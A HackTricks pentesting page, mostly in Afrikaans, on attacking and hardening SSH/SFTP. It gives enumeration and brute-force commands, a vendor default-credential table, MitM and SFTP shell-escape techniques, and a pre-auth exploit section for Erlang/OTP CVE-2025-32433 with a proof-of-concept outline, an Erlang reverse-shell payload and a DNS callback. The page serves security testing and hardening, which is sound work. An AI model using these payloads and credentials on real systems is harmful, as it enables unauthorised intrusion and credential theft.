# 22 - Pentesting SSH/SFTP

{{#include ../banners/hacktricks-training.md}}

## Basiese Inligting

**SSH (Secure Shell or Secure Socket Shell)** is 'n netwerkprotokol wat 'n veilige verbinding tot 'n rekenaar oor 'n ongesekureerde netwerk moontlik maak. Dit is noodsaaklik om die vertroulikheid en integriteit van data te handhaaf wanneer toegang tot afstandstelsels verkry word.

**Standaardpoort:** 22
```
22/tcp open  ssh     syn-ack
```
**SSH servers:**

- [openSSH](http://www.openssh.org) – OpenBSD SSH, ingesluit in BSD, Linux-verspreidings en Windows sedert Windows 10
- [Dropbear](https://matt.ucc.asn.au/dropbear/dropbear.html) – SSH-implementering vir omgewings met lae geheue- en verwerkerhulpbronne, ingesluit in OpenWrt
- [PuTTY](https://www.chiark.greenend.org.uk/~sgtatham/putty/) – SSH-implementering vir Windows, die kliënt word algemeen gebruik, maar die gebruik van die bediener is minder algemeen
- [CopSSH](https://www.itefix.net/copssh) – implementering van OpenSSH vir Windows

**SSH libraries (implementing server-side):**

- [libssh](https://www.libssh.org) – veelplatform C-biblioteek wat die SSHv2-protokol implementeer met bindings in [Python](https://github.com/ParallelSSH/ssh-python), [Perl](https://github.com/garnier-quentin/perl-libssh/) en [R](https://github.com/ropensci/ssh); dit word deur KDE gebruik vir sftp en deur GitHub vir die git SSH-infrastruktuur
- [wolfSSH](https://www.wolfssl.com/products/wolfssh/) – SSHv2-bedienerbiblioteek geskryf in ANSI C en gemik op ingebedde, RTOS en hulpbron-beperkte omgewings
- [Apache MINA SSHD](https://mina.apache.org/sshd-project/index.html) – Apache SSHD java library is based on Apache MINA
- [paramiko](https://github.com/paramiko/paramiko) – Python SSHv2-protokolbiblioteek

## Enumerasie

### Banner Grabbing
```bash
nc -vn <IP> 22
```
### Outomatiese ssh-audit

ssh-audit is 'n hulpmiddel vir die ouditering van ssh server- en client-konfigurasies.

[https://github.com/jtesta/ssh-audit](https://github.com/jtesta/ssh-audit) is 'n bygewerkte fork van [https://github.com/arthepsy/ssh-audit/](https://github.com/arthepsy/ssh-audit/)

**Kenmerke:**

- Ondersteuning vir SSH1- en SSH2-protokolle;
- Ontleed SSH client-konfigurasie;
- Haal banner, herken toestel of sagteware en bedryfstelsel, detecteer kompressie;
- Versamel key-exchange, host-key, encryption en message authentication code algoritmes;
- Gee algoritme-inligting uit (beskikbaar sedert, verwyder/gedeaktiveer, onveilig/swak/legacy, ens.);
- Gee algoritme-aanbevelings uit (voeg by of verwyder gebaseer op erkende sagtewareweergawe);
- Gee sekuriteitsinligting uit (verwante probleme, toegewezen CVE-lys, ens.);
- Analiseer SSH-weergawes se verenigbaarheid gebaseer op algoritme-inligting;
- Historiese inligting van OpenSSH, Dropbear SSH en libssh;
- Draai op Linux en Windows;
- Geen afhanklikhede
```bash
usage: ssh-audit.py [-1246pbcnjvlt] <host>

-1,  --ssh1             force ssh version 1 only
-2,  --ssh2             force ssh version 2 only
-4,  --ipv4             enable IPv4 (order of precedence)
-6,  --ipv6             enable IPv6 (order of precedence)
-p,  --port=<port>      port to connect
-b,  --batch            batch output
-c,  --client-audit     starts a server on port 2222 to audit client
software config (use -p to change port;
use -t to change timeout)
-n,  --no-colors        disable colors
-j,  --json             JSON output
-v,  --verbose          verbose output
-l,  --level=<level>    minimum output level (info|warn|fail)
-t,  --timeout=<secs>   timeout (in seconds) for connection and reading
(default: 5)
$ python3 ssh-audit <IP>
```
[See it in action (Asciinema)](https://asciinema.org/a/96ejZKxpbuupTK9j7h8BdClzp)

### Publieke SSH-sleutel van die server
```bash
ssh-keyscan -t rsa <IP> -p <PORT>
```
### Swak kriptografiese algoritmes

Dit word standaard deur **nmap** ontdek. Maar jy kan ook **sslcan** of **sslyze** gebruik.

### Nmap scripts
```bash
nmap -p22 <ip> -sC # Send default nmap scripts for SSH
nmap -p22 <ip> -sV # Retrieve version
nmap -p22 <ip> --script ssh2-enum-algos # Retrieve supported algorythms
nmap -p22 <ip> --script ssh-hostkey --script-args ssh_hostkey=full # Retrieve weak keys
nmap -p22 <ip> --script ssh-auth-methods --script-args="ssh.user=root" # Check authentication methods
```
### Shodan

- `ssh`

## Brute force usernames, passwords and private keys

### Username Enumeration

In sommige weergawes van OpenSSH kan jy 'n timing attack uitvoer om users te enumerate. Jy kan 'n metasploit module gebruik om dit te exploit:
```
msf> use scanner/ssh/ssh_enumusers
```
### [Brute force](../generic-hacking/brute-force.md#ssh)

Sommige algemene ssh credentials [here ](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt)and [here](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt) en hieronder.

### Private Key Brute Force

As jy sommige ssh private keys ken wat gebruik kan word... kom ons probeer dit. Jy kan die nmap script gebruik:
```
https://nmap.org/nsedoc/scripts/ssh-publickey-acceptance.html
```
Of die MSF auxiliary module:
```
msf> use scanner/ssh/ssh_identify_pubkeys
```
Of gebruik `ssh-keybrute.py` (native python3, liggewig en het legacy-algoritmes aangeskakel): [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute).

#### Bekende badkeys kan hier gevind word:


{{#ref}}
https://github.com/rapid7/ssh-badkeys/tree/master/authorized
{{#endref}}

#### Swak SSH-sleutels / Debian voorspelbare PRNG

Sommige stelsels het bekende foute in die ewekansige saad wat gebruik word om kriptografiese materiaal te genereer. Dit kan lei tot 'n dramaties verminderde sleutelruimte wat bruteforced kan word. Vooraf-gegenereerde stelle sleutels wat op Debian-stelsels gegenereer is en deur die swak PRNG geraak is, is hier beskikbaar: [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

Jy behoort hier te kyk om geldige sleutels vir die slagofferrekenaar te soek.

### Kerberos / GSSAPI SSO

As die teiken-SSH-bediener GSSAPI ondersteun (byvoorbeeld Windows OpenSSH op 'n domain controller), kan jy authentiseer met jou Kerberos TGT in plaas van 'n wagwoord.

Werkvloei vanaf 'n Linux aanvallermasjien:
```bash
# 1) Ensure time is in sync with the KDC to avoid KRB_AP_ERR_SKEW
sudo ntpdate <dc.fqdn>

# 2) Generate a krb5.conf for the target realm (optional, but handy)
netexec smb <dc.fqdn> -u <user> -p '<pass>' -k --generate-krb5-file krb5.conf
sudo cp krb5.conf /etc/krb5.conf

# 3) Obtain a TGT for the user
kinit <user>
klist

# 4) SSH with GSSAPI, using the FQDN that matches the host SPN
ssh -o GSSAPIAuthentication=yes <user>@<host.fqdn>
```
Notes:
- As jy met die verkeerde naam koppel (bv. kort gasheer, alias, of verkeerde volgorde in `/etc/hosts`), kan jy die fout kry: "Server not found in Kerberos database" omdat die SPN nie ooreenstem nie.
- `crackmapexec ssh --kerberos` kan ook jou ccache vir Kerberos-auth gebruik.

## Standaard Kredensiële

| **Verskaffer** | **Gebruikersname**                                                                                               | **Wagwoorde**                                                                                                                                                                                             |
| -------------- | --------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| APC            | apc, device                                                                                                     | apc                                                                                                                                                                                                       |
| Brocade        | admin                                                                                                           | admin123, password, brocade, fibranne                                                                                                                                                                     |
| Cisco          | admin, cisco, enable, hsa, pix, pnadmin, ripeop, root, shelladmin                                               | admin, Admin123, default, password, secur4u, cisco, Cisco, _Cisco, cisco123, C1sco!23, Cisco123, Cisco1234, TANDBERG, change_it, 12345, ipics, pnadmin, diamond, hsadb, c, cc, attack, blender, changeme |
| Citrix         | root, nsroot, nsmaint, vdiadmin, kvm, cli, admin                                                                | C1trix321, nsroot, nsmaint, kaviza, kaviza123, freebsd, public, rootadmin, wanscaler                                                                                                                      |
| D-Link         | admin, user                                                                                                     | private, admin, user                                                                                                                                                                                      |
| Dell           | root, user1, admin, vkernel, cli                                                                                | calvin, 123456, password, vkernel, Stor@ge!, admin                                                                                                                                                        |
| EMC            | admin, root, sysadmin                                                                                           | EMCPMAdm7n, Password#1, Password123#, sysadmin, changeme, emc                                                                                                                                             |
| HP/3Com        | admin, root, vcx, app, spvar, manage, hpsupport, opc_op                                                         | admin, password, hpinvent, iMC123, pvadmin, passw0rd, besgroup, vcx, nice, access, config, 3V@rpar, 3V#rpar, procurve, badg3r5, OpC_op, !manage, !admin                                                   |
| Huawei         | admin, root                                                                                                     | 123456, admin, root, Admin123, Admin@storage, Huawei12#$, HwDec@01, hwosta2.0, HuaWei123, fsp200@HW, huawei123                                                                                            |
| IBM            | USERID, admin, manager, mqm, db2inst1, db2fenc1, dausr1, db2admin, iadmin, system, device, ufmcli, customer     | PASSW0RD, passw0rd, admin, password, Passw8rd, iadmin, apc, 123456, cust0mer                                                                                                                              |
| Juniper        | netscreen                                                                                                       | netscreen                                                                                                                                                                                                 |
| NetApp         | admin                                                                                                           | netapp123                                                                                                                                                                                                 |
| Oracle         | root, oracle, oravis, applvis, ilom-admin, ilom-operator, nm2user                                               | changeme, ilom-admin, ilom-operator, welcome1, oracle                                                                                                                                                     |
| VMware         | vi-admin, root, hqadmin, vmware, admin                                                                          | vmware, vmw@re, hqadmin, default                                                                                                                                                                          |

## SSH-MitM

As jy in die plaaslike netwerk is en die slagoffer gaan met gebruikersnaam en wagwoord na die SSH-bediener koppel, kan jy probeer om 'n MitM-aanval uit te voer om daardie kredensiële te steel:

Aanvals-pad:

- Traffic Redirection: Die aanvaller lei die slagoffer se verkeer om na hul masjien, en onderskep dus die verbindingspoging na die SSH-bediener.
- Interception and Logging: Die aanvaller se masjien tree op as 'n proxy en kap die gebruiker se aanmeldbesonderhede deur voor te gee dat dit die regte SSH-bediener is.
- Command Execution and Relay: Laastens log die aanvaller se bediener die gebruiker se kredensiële, stuur die opdragte deur na die werklike SSH-bediener, voer dit uit, en stuur die resultate terug aan die gebruiker, wat die proses na aan die oog laat voorkom.

[**SSH MITM**](https://github.com/jtesta/ssh-mitm) doen presies soos hierbo beskryf.

Om die MitM werklik uit te voer, kan jy tegnieke soos ARP spoofing, DNS spoofing of ander wat in die [**Network Spoofing attacks**](../generic-methodologies-and-resources/pentesting-network/index.html#spoofing) beskryf word, gebruik.

## SSH-Snake

As jy 'n netwerk wil deurgang deur gevonde SSH private keys op stelsels te gebruik, en elke private sleutel op elke stelsel vir nuwe gashere te probeer, dan is [**SSH-Snake**](https://github.com/MegaManSec/SSH-Snake) wat jy nodig het.

SSH-Snake voer die volgende take outomaties en rekursief uit:

1. Op die huidige stelsel, vind enige SSH private keys,
2. Op die huidige stelsel, vind enige gashere of bestemmings (user@host) waar die private sleutels aanvaar kan word,
3. Probeer om in te SSH na al die bestemmings met al die gevonde private sleutels,
4. As 'n bestemming suksesvol bereik word, herhaal dit stappe #1 - #4 op die gekonnekteerde stelsel.

Dit is heeltemal self-replikerend en self-propagërend — en heeltemal fileless.

## Konfigurasiefoute

### Root-aanmelding

Dit is algemeen dat SSH-bedieners standaard root-gebruiker aanmelding toelaat, wat 'n beduidende sekuriteitsrisiko vorm. Om root-aanmelding uit te skakel is 'n kritieke stap om die bediener te beveilig. Ongemagtigde toegang met administratiewe regte en brute-force-aanvalle kan met hierdie verandering gemilder word.

Om Root-aanmelding in OpenSSH uit te skakel:

1. Edit die SSH-konfigurasielêer met: `sudoedit /etc/ssh/sshd_config`
2. Verander die instelling van `#PermitRootLogin yes` na **`PermitRootLogin no`**.
3. Herlaai die konfigurasie met: `sudo systemctl daemon-reload`
4. Herbegin die SSH-bediener om die veranderinge toe te pas: `sudo systemctl restart sshd`

### SFTP Brute Force

- [**SFTP Brute Force**](../generic-hacking/brute-force.md#sftp)

### SFTP opdrag-uitvoering

Daar is 'n algemene oorhoofse fout in SFTP-opstellings waar administrateurs beoog dat gebruikers lêers kan ruil sonder om remote shell-toegang toe te laat. Ondanks dat gebruikers met nie-interaktiewe shells (bv. `/usr/bin/nologin`) ingestel is en tot 'n spesifieke gids beperk is, bly daar 'n sekuriteitsleemte. Gebruikers kan hierdie beperkings omseil deur die uitvoering van 'n opdrag (soos `/bin/bash`) onmiddellik na aanmelding te versoek, voordat hul aangewese nie-interaktiewe shell oorneem. Dit maak ongemagtigde opdrag-uitvoering moontlik en ondermyn die beoogde sekuriteitsmaatreëls.

[Voorbeeld hiervandaan](https://community.turgensec.com/ssh-hacking-guide/):
```bash
ssh -v noraj@192.168.1.94 id
...
Password:
debug1: Authentication succeeded (keyboard-interactive).
Authenticated to 192.168.1.94 ([192.168.1.94]:22).
debug1: channel 0: new [client-session]
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: network
debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
debug1: Sending command: id
debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
uid=1000(noraj) gid=100(users) groups=100(users)
debug1: channel 0: free: client-session, nchannels 1
Transferred: sent 2412, received 2480 bytes, in 0.1 seconds
Bytes per second: sent 43133.4, received 44349.5
debug1: Exit status 0

$ ssh noraj@192.168.1.94 /bin/bash
```
Hier is 'n voorbeeld van 'n veilige SFTP-konfigurasie (`/etc/ssh/sshd_config` – openSSH) vir die gebruiker `noraj`:
```
Match User noraj
ChrootDirectory %h
ForceCommand internal-sftp
AllowTcpForwarding no
PermitTunnel no
X11Forwarding no
PermitTTY no
```
Hierdie konfigurasie sal slegs SFTP toelaat: dit skakel shell-toegang uit deur die start command af te dwing en TTY-toegang te deaktiveer, maar dit skakel ook alle vorme van port forwarding of tunneling uit.

### SFTP Tunneling

As jy toegang het tot 'n SFTP-server, kan jy jou verkeer ook hierdeur tunnel, byvoorbeeld deur die algemene port forwarding te gebruik:
```bash
sudo ssh -L <local_port>:<remote_host>:<remote_port> -N -f <username>@<ip_compromised>
```
### SFTP Symlink

Die **sftp** het die opdrag "**symlink**". Daarom, as jy **writable rights** in 'n bepaalde gids het, kan jy **symlinks** van **ander gidse/lêers** skep. Aangesien jy waarskynlik binne 'n chroot vasgevang is, sal dit vir jou nie besonder nuttig wees nie, maar as jy toegang tot die geskepte **symlink** vanaf 'n **no-chroot** **service** kan kry (byvoorbeeld as jy die symlink vanaf die web kan bereik), kan jy die **symlinked files** deur die web oopmaak.

Byvoorbeeld, om 'n **symlink** te skep van 'n nuwe lêer **"**_**froot**_**" na "**_**/**_**"**:
```bash
sftp> symlink / froot
```
As jy toegang tot die lêer "_froot_" via die web het, kan jy die root ("/")-gids van die stelsel lys.

### Verifikasie-metodes

In 'n omgewing met hoë sekuriteit is dit algemeen om slegs sleutel-gebaseerde of tweefaktor-verifikasie te aktiveer eerder as die enkel-faktor wagwoordgebaseerde verifikasie. Maar dikwels word die sterker verifikasiemetodes geaktiveer sonder om die swakker een uit te skakel. 'n Gereelde geval is om `publickey` in die openSSH-konfigurasie te aktiveer en dit as die verstekmetode te stel, maar nie `password` uit te skakel nie. Deur die verbose-modus van die SSH-kliënt te gebruik, kan 'n aanvaller sien dat 'n swakker metode geaktiveer is:
```bash
ssh -v 192.168.1.94
OpenSSH_8.1p1, OpenSSL 1.1.1d  10 Sep 2019
...
debug1: Authentications that can continue: publickey,password,keyboard-interactive
```
Byvoorbeeld, as 'n authentication failure limit gestel is en jy nooit die kans kry om die password method te bereik nie, kan jy die `PreferredAuthentications`-opsie gebruik om hierdie metode af te dwing.
```bash
ssh -v 192.168.1.94 -o PreferredAuthentications=password
...
debug1: Next authentication method: password
```
Dit is nodig om die SSH-bediener se konfigurasie te hersien om te kontroleer dat slegs verwagte metodes gemagtig is. Om die uitgebreide modus op die kliënt te gebruik, kan help om die doeltreffendheid van die konfigurasie te bepaal.

### Konfigurasielêers
```bash
ssh_config
sshd_config
authorized_keys
ssh_known_hosts
known_hosts
id_rsa
```
## Fuzzing

- [https://packetstormsecurity.com/files/download/71252/sshfuzz.txt](https://packetstormsecurity.com/files/download/71252/sshfuzz.txt)
- [https://www.rapid7.com/db/modules/auxiliary/fuzzers/ssh/ssh_version_2](https://www.rapid7.com/db/modules/auxiliary/fuzzers/ssh/ssh_version_2)

## Authentication State-Machine Bypass (Pre-Auth RCE)

Verskeie SSH-serverimplementasies bevat logiese foute in die **authentication finite-state machine** wat 'n kliënt toelaat om *connection-protocol* boodskappe te stuur **voordat** authenticatie voltooi is. Omdat die bediener versuim om te verifieer dat dit in die korrekte toestand is, word daardie boodskappe hanteer asof die gebruiker ten volle geauthentiseer is, wat kan lei tot **unauthenticated code execution** of sessieskepping.

Op protokolvlak behoort enige SSH-boodskap met 'n _message code_ **≥ 80** (0x50) tot die *connection* laag (RFC 4254) en moet **slegs aanvaar word ná suksesvolle authenticatie** (RFC 4252). As die bediener een van daardie boodskappe verwerk terwyl dit nog in die *SSH_AUTHENTICATION* toestand is, kan die aanvaller onmiddellik 'n kanaal skep en aksies versoek soos command execution, port-forwarding, ens.

### Generiese uitbuitingstappe
1. Stel 'n TCP-verbinding na die teiken se SSH-poort op (gewoonlik 22, maar ander dienste mag Erlang/OTP op 2022, 830, 2222… blootstel).
2. Stel 'n rou SSH-pakket saam:
* 4-byte **packet_length** (big-endian)
* 1-byte **message_code** ≥ 80 (e.g. `SSH_MSG_CHANNEL_OPEN` = 90, `SSH_MSG_CHANNEL_REQUEST` = 98)
* Payload wat deur die gekose boodskaptipe verstaan sal word
3. Stuur die pakket(te) **voordat enige authenticatiestap voltooi is**.
4. Interageer met die bediener-API's wat nou pre-auth blootgestel is (command execution, port forwarding, file-system access, …).

Python proof-of-concept outline:
```python
import socket, struct
HOST, PORT = '10.10.10.10', 22
s = socket.create_connection((HOST, PORT))
# skip version exchange for brevity – send your own client banner then read server banner
# … key exchange can be skipped on vulnerable Erlang/OTP because the bug is hit immediately after the banner
# Packet: len(1)=1, SSH_MSG_CHANNEL_OPEN (90)
pkt  = struct.pack('>I', 1) + b'\x5a'  # 0x5a = 90
s.sendall(pkt)
# additional CHANNEL_REQUEST packets can follow to run commands
```
In die praktyk sal jy die key-exchange volgens die teiken-implementasie moet uitvoer (of oorslaan), maar **no authentication** word nooit uitgevoer nie.

---
### Erlang/OTP `sshd` (CVE-2025-32433)
* **Geaffekteerde weergawes:** OTP < 27.3.3, 26.2.5.11, 25.3.2.20
* **Worteloorsaak:** die Erlang native SSH daemon valideer nie die huidige toestand voordat dit `ssh_connection:handle_msg/2` aanroep nie. Daarom bereik enige pakket met 'n boodskapkode 80-255 die konneksiebehandelaar terwyl die sessie nog in die *userauth* toestand is.
* **Impak:** unauthenticated **remote code execution** (the daemon usually runs as **root** on embedded/OT devices).

Voorbeeld payload wat 'n reverse shell spawn gebind aan die attacker-controlled channel:
```erlang
% open a channel first … then:
execSinet:cmd(Channel, "exec('/bin/sh', ['-i'], [{fd, Channel#channel.fd}, {pid, true}]).").
```
Blind RCE / out-of-band detection kan via DNS uitgevoer word:
```erlang
execSinet:gethostbyname("<random>.dns.outbound.watchtowr.com").Zsession
```
Opsporing & Mitigering:
* Inspect SSH traffic: **verwerp enige pakket met boodskapkode ≥ 80 wat voor verifikasie waargeneem word**.
* Opgradeer Erlang/OTP na **27.3.3 / 26.2.5.11 / 25.3.2.20** of nuwer.
* Beperk blootstelling van bestuursporte (22/2022/830/2222) – veral op OT-toerusting.

---
### Ander implementasies aangetas
* **libssh** 0.6 – 0.8 (server side) – **CVE-2018-10933** – aanvaar `SSH_MSG_USERAUTH_SUCCESS` wat nie-geauthentiseerd deur die kliënt gestuur is, effektief die omgekeerde logika-fout.

Die algemene les is dat enige afwijking van die RFC-voorgeskrewe toestandsoorgange katastrofaal kan wees; wanneer jy SSH-daemons hersien of fuzzing uitvoer, gee besondere aandag aan *staatmasjienhandhawing*.



## Verwysings

- [Unit 42 – Erlang/OTP SSH CVE-2025-32433](https://unit42.paloaltonetworks.com/erlang-otp-cve-2025-32433/)
- [SSH hardening guides](https://www.ssh-audit.com/hardening_guides.html)
- [Turgensec SSH hacking guide](https://community.turgensec.com/ssh-hacking-guide)
- [Pentesting Kerberos (88) – client setup and troubleshooting](pentesting-kerberos-88/README.md)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)

## HackTricks Outomatiese Opdragte
```
Protocol_Name: SSH
Port_Number: 22
Protocol_Description: Secure Shell Hardening

Entry_1:
Name: Hydra Brute Force
Description: Need Username
Command: hydra -v -V -u -l {Username} -P {Big_Passwordlist} -t 1 {IP} ssh

Entry_2:
Name: consolesless mfs enumeration
Description: SSH enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_version; set RHOSTS {IP}; set RPORT 22; run; exit' && msfconsole -q -x 'use scanner/ssh/ssh_enumusers; set RHOSTS {IP}; set RPORT 22; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ssh/juniper_backdoor; set RHOSTS {IP}; set RPORT 22; run; exit'

```
{{#include ../banners/hacktricks-training.md}}
